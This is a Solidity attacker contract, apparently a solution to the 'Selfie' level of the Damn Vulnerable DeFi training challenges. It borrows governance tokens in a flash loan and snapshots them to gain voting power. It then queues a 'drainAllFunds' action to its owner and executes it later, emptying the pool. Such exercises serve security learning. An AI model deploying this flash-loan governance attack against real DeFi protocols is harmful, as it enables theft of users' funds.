// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract SelfieAttacker {

    address payable private immutable owner;
    SimpleGovernance private immutable governance;
    ERC20Snapshot private immutable token;
    SelfiePool private immutable pool;
    uint256 public actionId;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only callable by owner");
        _;
    }

    constructor(address _governance, address _token, address _pool) {
        owner = payable(msg.sender);
        governance = SimpleGovernance(_governance);
        token = ERC20Snapshot(_token);
        pool = SelfiePool(_pool);
    }

    function startExploit(uint256 amount) public onlyOwner {
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot governanceToken = DamnValuableTokenSnapshot(tokenAddress);
        governanceToken.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        uint256 _actionId = governance.queueAction(address(pool), data, 0);
        actionId = _actionId;
        token.transfer(address(pool), amount);
    }

    function withdrawAssets() public onlyOwner {
        governance.executeAction(actionId);
    }
}